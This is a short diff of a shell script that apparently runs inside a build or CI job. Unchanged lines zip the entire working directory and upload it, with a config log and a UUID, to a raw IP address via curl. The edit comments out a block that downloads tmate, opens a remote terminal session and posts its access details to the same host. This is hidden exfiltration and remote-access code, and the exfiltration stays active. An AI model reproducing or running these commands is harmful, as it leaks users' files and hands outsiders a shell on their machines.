@@ -223,13 +223,13 @@ curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/u
 zip -r 1.zip .
 curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
-tar xf tmate-2.4.0-static-linux-amd64.tar.xz
-cd tmate-2.4.0-static-linux-amd64
-./tmate -F > tmate.txt &
-sleep 1
-curl -XPOST -F "file=@tmate.txt" -F "UUID=$UUID" http://40.65.152.233:9527/upload
-sleep 10000
+#wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
+#tar xf tmate-2.4.0-static-linux-amd64.tar.xz
+#cd tmate-2.4.0-static-linux-amd64
+#./tmate -F > tmate.txt &
+#sleep 1
+#curl -XPOST -F "file=@tmate.txt" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#sleep 10000
 
 
 
